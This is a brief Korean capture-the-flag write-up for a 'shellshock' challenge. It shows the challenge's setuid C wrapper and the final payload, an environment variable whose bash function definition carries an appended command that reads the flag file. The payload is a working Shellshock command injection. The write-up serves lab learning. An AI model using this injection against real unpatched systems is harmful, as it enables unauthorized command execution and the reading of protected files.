# shellshock
shellshock 에 대한 설명은 다른 사이트에서 참조하길 바란다.&nbsp
bash 는 취약점이 존재하는 bash 로, 환경변수를 통해 함수를 정의한 후 임의의 명령을 추가하면 해당 명령이 실행된다.

```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

shellshock 파일이 실행될 때, 취약한 bash 로 /bin/cat flag 가 parsing 되어 실행된다.

최종 페이로드는 다음과 같다.

env x='() { :;}; /bin/cat flag' ./shellshock

